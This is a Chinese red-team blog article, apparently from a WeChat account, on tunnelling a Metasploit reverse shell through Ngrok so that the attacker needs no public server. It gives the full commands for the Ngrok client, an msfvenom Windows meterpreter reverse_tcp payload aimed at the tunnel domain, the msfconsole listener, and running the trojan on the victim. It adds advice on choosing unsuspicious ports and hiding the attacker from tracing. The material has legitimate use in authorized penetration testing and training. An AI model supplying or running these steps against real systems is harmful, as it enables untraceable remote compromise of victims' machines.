> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PywNbakSZmIVhfbKARfMmA)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **55** 篇文章，本公众号会记录一些红队攻击的笔记（由浅到深），不定时更新

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

Ngrok

Ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。

反向代理在计算机网络中是代理服务器的一种。服务器根据客户端的请求，从其关系的一组或多组后端服务器（如 Web 服务器）上获取资源，然后再将这些资源返回给客户端，客户端只会得知反向代理的 IP 地址，而不知道在代理服务器后面的服务器集群的存在。

**通过利用 Ngrok 我们可以使用最少的成本去通过 Metasploit 隐蔽自己，从而达到目标很难追踪到自己。**

**内网 Kali 通过 Ngrok 穿透反弹 shell 到 Metasploit**

**具体演示**

首先要去下载一个 Ngrok 客户端：https://www.ngrok.cc/download.html

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKMshmXtFCVfMuibVxvcMotKF6vhf1OZ6On7IiaPeFFFDkHKibEHiaTx589oKyZ4xwfzDldhGvK86NFcw/640?wx_fmt=png)

这里主要选择 tcp 隧道，然后本地端口也就是 Kail 要监听的端口，我这里选了 8888 端口（**在实际攻击场景中尽量选择一些不让人怀疑的高端口，例如 26458 等等，别设置例如：4444 、5555、6666 这种端口，具体原因不必多说**），然后会有一个域名和隧道 ID：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKMshmXtFCVfMuibVxvcMotKr90hxusFBK3FQwSo2dIFdm1icYMNUPH7SphI7VERvsI6LOWuibW7r9fg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKMshmXtFCVfMuibVxvcMotK8TZqD3RyePH311X8HjYEictGg2Q1BDnIlZF5dBiaV6Fo4Tc3biaLkHXZw/640?wx_fmt=png)

然后在 Kali 上运行 Ngrok：  

```
./sunny clientid 你的隧道id
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKMshmXtFCVfMuibVxvcMotKaeZtiaibA6BRpcTJCNQYwvOOzicWBxgBXER0z0baLKic7ngwNmo1CYroCA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKMshmXtFCVfMuibVxvcMotK3z5rQgSFx7fH52KvvFdYS5z7SWAFqNZOYUORktqnQtmqDFYPl2ROeQ/640?wx_fmt=png)

这个时候就做好内网穿透了！因为是通过 Kali 本机的 8888 端口给转发到 Ngrok 的 10073，所以就得生成一个反向，然后端口是 10073 的木马：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxxx.xxxx.com LPORT=10073 -f exe > 8888.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKMshmXtFCVfMuibVxvcMotKDcnL3SHO8xM0ahnBxXiaF90pYW2qHafIVkb8brK9LNoaQK53nmEwyHw/640?wx_fmt=png)

最后 Kali 打开 MSF 控制台 msfconsole 开启监听（注意这里的端口需要设置为 8888，ip 设置为本地 127.0.0.1 ）：

```
msf > set lhost 127.0.0.1
msf > set lport 8888
msf > exploit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKMshmXtFCVfMuibVxvcMotKquQNViaPmaVn9peP7yCJ7OhckiaAoIyswJmzfbDQibLPmia6W7IXrZfibPQ/640?wx_fmt=jpeg)最后运行 8888.exe 成功反弹 Meterpreter 到 Metasploit：

```
cmd /c start 8888.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKMshmXtFCVfMuibVxvcMotKC6MfgfPym03ufEE5q4pibbObFw1zkIzVepWhM92YPBKibVYkCFnCqJVw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKMshmXtFCVfMuibVxvcMotKbzNAJ9YqvAYVDV0iaU7N7Rj6IXiboDYqd9zxzeosq0tEIyoklujVkQJw/640?wx_fmt=jpeg)

这样就能实现无需公网 VPS 就能反弹 Shell。通过这样的方式能够以最少的成本去隐蔽自己，当然这种方式也不是最有效的隐蔽手段，但是是最快捷的方式，通过 Ngrok 能基本上能满足大部分渗透的需求。

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看